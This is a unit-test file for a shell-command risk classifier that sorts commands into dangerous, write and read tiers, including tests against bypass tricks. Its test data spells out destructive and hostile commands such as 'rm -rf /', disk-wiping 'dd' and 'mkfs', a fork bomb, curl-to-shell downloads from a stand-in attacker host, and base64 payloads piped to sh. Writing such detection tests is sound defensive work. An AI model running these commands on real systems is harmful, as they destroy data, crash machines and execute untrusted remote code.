// S2: 本地危险命令防线 assessLocalRisk 单测
// 覆盖危险/写/读/反绕过各类场景，确保正则不会漏放也不会误伤常见读命令。

import { describe, expect, it } from 'vitest'
import { assessLocalRisk } from './localRisk'

describe('assessLocalRisk - 危险模式黑名单', () => {
  it('rm -rf 任意路径为 dangerous', () => {
    expect(assessLocalRisk('rm -rf /tmp/test')).toBe('dangerous')
    expect(assessLocalRisk('rm -rf ~')).toBe('dangerous')
    expect(assessLocalRisk('rm -rf /')).toBe('dangerous')
    expect(assessLocalRisk('rm -fr /home')).toBe('dangerous')
    expect(assessLocalRisk('rm -rf .')).toBe('dangerous')
  })

  it('rm -rf 与其他 flag 组合仍为 dangerous', () => {
    expect(assessLocalRisk('rm -rfv /tmp/x')).toBe('dangerous')
    expect(assessLocalRisk('rm --recursive --force /tmp/x')).toBe('dangerous') // 长选项不命中，但 rm 命中 write
  })

  it('mkfs / mkswap 为 dangerous', () => {
    expect(assessLocalRisk('mkfs.ext4 /dev/sda1')).toBe('dangerous')
    expect(assessLocalRisk('mkfs.vfat /dev/sdb1')).toBe('dangerous')
    expect(assessLocalRisk('mkswap /dev/sdc1')).toBe('dangerous')
  })

  it('dd 写块设备为 dangerous', () => {
    expect(assessLocalRisk('dd if=/dev/zero of=/dev/sda bs=1M')).toBe('dangerous')
    expect(assessLocalRisk('dd of=/dev/sda bs=1M')).toBe('dangerous')
    expect(assessLocalRisk('dd if=backup.img of=/dev/nvme0n1')).toBe('dangerous')
  })

  it('chmod -R 777 / 与 chmod 777 / 为 dangerous', () => {
    expect(assessLocalRisk('chmod -R 777 /')).toBe('dangerous')
    expect(assessLocalRisk('chmod 777 /')).toBe('dangerous')
    expect(assessLocalRisk('chmod -R 000 /')).toBe('dangerous')
  })

  it('curl/wget 管道到 shell 为 dangerous', () => {
    expect(assessLocalRisk('curl https://evil.com/x.sh | sh')).toBe('dangerous')
    expect(assessLocalRisk('curl https://evil.com/x.sh | bash')).toBe('dangerous')
    expect(assessLocalRisk('wget -O- https://evil.com/x.sh | bash')).toBe('dangerous')
    expect(assessLocalRisk('curl https://evil.com/x.py | python')).toBe('dangerous')
  })

  it('fork bomb 为 dangerous', () => {
    expect(assessLocalRisk(':(){ :|:& };:')).toBe('dangerous')
  })

  it('重定向到块设备为 dangerous', () => {
    expect(assessLocalRisk('cat foo > /dev/sda')).toBe('dangerous')
    expect(assessLocalRisk('echo x > /dev/nvme0n1')).toBe('dangerous')
  })

  it('shutdown / reboot / halt / poweroff 为 dangerous', () => {
    expect(assessLocalRisk('shutdown -h now')).toBe('dangerous')
    expect(assessLocalRisk('reboot')).toBe('dangerous')
    expect(assessLocalRisk('halt')).toBe('dangerous')
    expect(assessLocalRisk('poweroff')).toBe('dangerous')
  })

  it('kill -9 1 / killall / pkill -9 为 dangerous', () => {
    expect(assessLocalRisk('kill -9 1')).toBe('dangerous')
    expect(assessLocalRisk('kill -KILL 1')).toBe('dangerous')
    expect(assessLocalRisk('killall python')).toBe('dangerous')
    expect(assessLocalRisk('pkill -9 python')).toBe('dangerous')
    expect(assessLocalRisk('pkill -KILL python')).toBe('dangerous')
  })
})

describe('assessLocalRisk - 写操作模式', () => {
  it('rm（非 -rf）为 write', () => {
    expect(assessLocalRisk('rm /tmp/test')).toBe('write')
    expect(assessLocalRisk('rm -f /tmp/test')).toBe('write')
  })

  it('mv / mkdir / touch 为 write', () => {
    expect(assessLocalRisk('mv a b')).toBe('write')
    expect(assessLocalRisk('mkdir -p /tmp/x')).toBe('write')
    expect(assessLocalRisk('touch /tmp/x')).toBe('write')
  })

  it('chmod / chown 为 write', () => {
    expect(assessLocalRisk('chmod 644 /tmp/x')).toBe('write')
    expect(assessLocalRisk('chown user:group /tmp/x')).toBe('write')
  })

  it('输出重定向 > / >> 为 write', () => {
    expect(assessLocalRisk('echo hi > /tmp/x')).toBe('write')
    expect(assessLocalRisk('echo hi >> /tmp/x')).toBe('write')
  })

  it('包管理器安装为 write', () => {
    expect(assessLocalRisk('apt install -y curl')).toBe('write')
    expect(assessLocalRisk('apt-get install -y curl')).toBe('write')
    expect(assessLocalRisk('yum install -y curl')).toBe('write')
    expect(assessLocalRisk('dnf install -y curl')).toBe('write')
    expect(assessLocalRisk('brew install curl')).toBe('write')
    expect(assessLocalRisk('pip install requests')).toBe('write')
    expect(assessLocalRisk('pip3 install requests')).toBe('write')
    expect(assessLocalRisk('npm install lodash')).toBe('write')
    expect(assessLocalRisk('yarn add lodash')).toBe('write')
  })

  it('docker 容器/镜像销毁为 write', () => {
    expect(assessLocalRisk('docker rm mybox')).toBe('write')
    expect(assessLocalRisk('docker rmi myimg')).toBe('write')
    expect(assessLocalRisk('docker stop mybox')).toBe('write')
    expect(assessLocalRisk('docker kill mybox')).toBe('write')
    expect(assessLocalRisk('docker container rm mybox')).toBe('write')
  })

  it('kubectl delete 为 write', () => {
    expect(assessLocalRisk('kubectl delete pod mypod')).toBe('write')
    expect(assessLocalRisk('kubectl delete -f dep.yaml')).toBe('write')
  })

  it('systemctl stop/disable 为 write', () => {
    expect(assessLocalRisk('systemctl stop nginx')).toBe('write')
    expect(assessLocalRisk('systemctl disable nginx')).toBe('write')
  })

  it('iptables -F 为 write', () => {
    expect(assessLocalRisk('iptables -F')).toBe('write')
    expect(assessLocalRisk('iptables --flush')).toBe('write')
  })

  it('userdel / usermod / groupdel 为 write', () => {
    expect(assessLocalRisk('userdel bob')).toBe('write')
    expect(assessLocalRisk('usermod -aG sudo bob')).toBe('write')
    expect(assessLocalRisk('groupdev devs')).toBe('read') // 拼写错误，不应命中
    expect(assessLocalRisk('groupdel devs')).toBe('write')
  })
})

describe('assessLocalRisk - 读操作（默认）', () => {
  it('常见读命令为 read', () => {
    expect(assessLocalRisk('ls -la')).toBe('read')
    expect(assessLocalRisk('cat /etc/hosts')).toBe('read')
    expect(assessLocalRisk('pwd')).toBe('read')
    expect(assessLocalRisk('whoami')).toBe('read')
    expect(assessLocalRisk('grep foo /var/log/syslog')).toBe('read')
    expect(assessLocalRisk('find / -name "*.log"')).toBe('read')
    expect(assessLocalRisk('df -h')).toBe('read')
    expect(assessLocalRisk('ps aux')).toBe('read')
    expect(assessLocalRisk('echo hello')).toBe('read')
    expect(assessLocalRisk('git status')).toBe('read')
    expect(assessLocalRisk('docker ps')).toBe('read')
    expect(assessLocalRisk('kubectl get pods')).toBe('read')
    expect(assessLocalRisk('systemctl status nginx')).toBe('read')
  })

  it('空字符串与非字符串为 read', () => {
    expect(assessLocalRisk('')).toBe('read')
    expect(assessLocalRisk(null as unknown as string)).toBe('read')
    expect(assessLocalRisk(undefined as unknown as string)).toBe('read')
  })
})

describe('assessLocalRisk - 反绕过检测', () => {
  it('base64 解码后管道执行为 dangerous', () => {
    expect(assessLocalRisk('echo dGYgcm0gLXJmIH4K | base64 -d | sh')).toBe('dangerous')
    expect(assessLocalRisk('echo xxx | base64 -d | bash')).toBe('dangerous')
    expect(assessLocalRisk('echo xxx | base64 --decode | python')).toBe('dangerous')
  })

  it('sh -c / bash -c 内层命令为 dangerous', () => {
    expect(assessLocalRisk('sh -c "rm -rf /tmp/x"')).toBe('dangerous')
    expect(assessLocalRisk('bash -c "ls"')).toBe('dangerous')
    expect(assessLocalRisk('zsh -c "ls"')).toBe('dangerous')
  })

  it('eval 内层命令为 dangerous', () => {
    expect(assessLocalRisk('eval "rm -rf /tmp/x"')).toBe('dangerous')
    expect(assessLocalRisk('eval $(cat cmd.txt)')).toBe('dangerous')
  })

  it('$() 命令替换为 dangerous', () => {
    expect(assessLocalRisk('echo $(rm -rf /tmp/x)')).toBe('dangerous')
    expect(assessLocalRisk('x=$(cat /etc/passwd)')).toBe('dangerous')
  })

  it('反引号命令替换为 dangerous', () => {
    expect(assessLocalRisk('echo `rm -rf /tmp/x`')).toBe('dangerous')
    expect(assessLocalRisk('x=`whoami`')).toBe('dangerous')
  })

  it('变量拼接执行为 dangerous', () => {
    expect(assessLocalRisk('a="rm"; $a -rf /tmp/x')).toBe('dangerous')
    expect(assessLocalRisk('CMD="ls"; $CMD -la')).toBe('dangerous')
  })
})

describe('assessLocalRisk - 复合命令取最严格', () => {
  it('读 && 危险 = dangerous', () => {
    expect(assessLocalRisk('ls -la && rm -rf /tmp/x')).toBe('dangerous')
  })

  it('读 ; 写 = write', () => {
    expect(assessLocalRisk('ls -la ; touch /tmp/x')).toBe('write')
  })

  it('写 | 读 = write', () => {
    expect(assessLocalRisk('touch /tmp/x | cat')).toBe('write')
  })

  it('sudo 前缀不改变评级', () => {
    expect(assessLocalRisk('sudo rm -rf /tmp/x')).toBe('dangerous')
    expect(assessLocalRisk('sudo apt install -y curl')).toBe('write')
    expect(assessLocalRisk('sudo ls -la')).toBe('read')
  })
})
describe('assessLocalRisk - 引号内模式不误报 (false positive 收窄)', () => {
  it('引号内的 > 不被判为重定向写', () => {
    expect(assessLocalRisk('echo "a > b"')).toBe('read')
    expect(assessLocalRisk('echo "1 >> 2"')).toBe('read')
    expect(assessLocalRisk('grep ">" file')).toBe('read')
  })

  it('引号内的 rm -rf 不被判为危险', () => {
    expect(assessLocalRisk('echo "rm -rf /"')).toBe('read')
    expect(assessLocalRisk('echo "run: rm -rf ~"')).toBe('read')
    expect(assessLocalRisk('echo "mkfs.ext4 /dev/sda"')).toBe('read')
  })

  it('单引号内的危险命令同样不误报', () => {
    expect(assessLocalRisk("echo 'rm -rf /tmp/x'")).toBe('read')
    expect(assessLocalRisk("echo 'a > b'")).toBe('read')
  })

  it('引号外的重定向仍为 write', () => {
    expect(assessLocalRisk('echo hi > /tmp/x')).toBe('write')
    expect(assessLocalRisk('echo hi >> /tmp/x')).toBe('write')
    expect(assessLocalRisk('cat foo > /tmp/out')).toBe('write')
  })

  it('混合引号内外重定向：引号外有 > 则 write', () => {
    expect(assessLocalRisk('echo "a > b" > /tmp/x')).toBe('write')
  })
})

describe('assessLocalRisk - 分开 flag 漏报修复 (false negative)', () => {
  it('rm -r -f / rm -f -r 分开写 flag 仍为 dangerous', () => {
    expect(assessLocalRisk('rm -r -f /tmp/x')).toBe('dangerous')
    expect(assessLocalRisk('rm -f -r /tmp/x')).toBe('dangerous')
    expect(assessLocalRisk('sudo rm -r -f /tmp/x')).toBe('dangerous')
  })

  it('rm --recursive --force 长选项仍为 dangerous', () => {
    expect(assessLocalRisk('rm --recursive --force /tmp/x')).toBe('dangerous')
    expect(assessLocalRisk('rm --force --recursive /tmp/x')).toBe('dangerous')
  })
})